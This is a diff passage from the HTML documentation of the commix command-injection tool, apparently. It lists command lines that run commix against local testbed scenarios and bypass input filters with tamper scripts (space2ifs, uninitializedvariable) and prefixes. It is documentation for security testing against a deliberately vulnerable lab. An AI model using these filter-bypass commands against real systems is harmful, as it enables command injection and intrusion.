+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars_start_alphanum.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span> --prefix<span class="o">=</span><span class="s2">&quot;abc&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_white_chars_stop_alnum.php">no_white_chars_stop_alnum.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars_stop_alnum.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars_stop_alnum.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/simple_stop_alphanum.php">simple_stop_alphanum.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/simple_stop_alphanum.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--prefix<span class="o">=</span><span class="s2">&quot;abc&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/simple_stop_alphanum.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --prefix<span class="o">=</span><span class="s2">&quot;abc&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/simple_start_alphanum.php">simple_start_alphanum.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/simple_start_alphanum.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/simple_start_alphanum.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/multiple_os_commands_blacklisting.php">multiple_os_commands_blacklisting.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/multiple_os_commands_blacklisting.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;uninitializedvariable&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/multiple_os_commands_blacklisting.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;uninitializedvariable&quot;</span>
 </code></pre></div>
 
 
